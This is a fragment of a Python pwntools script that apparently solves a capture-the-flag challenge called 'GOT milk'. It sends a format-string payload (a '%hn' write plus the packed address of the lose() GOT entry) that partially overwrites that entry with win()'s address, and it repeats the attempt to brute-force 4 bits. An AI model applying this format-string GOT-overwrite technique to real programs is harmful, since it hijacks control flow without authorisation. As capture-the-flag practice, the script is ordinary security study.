...
if __name__ == '__main__':
    ...
    while True:
        ...
        T.recvuntil('GOT milk? ')

        # Overwrite the lower portion of lose() address in the GOT with the
        # lower bytes of win(). We only have to guess 4 bits.
        T.sendline('%29065x%11$hnXXX' + pwn.p32(BINARY.got['lose']))
        try:
            T.recvuntil('answer: ')
            answer = T.recvall()
        except Exception:
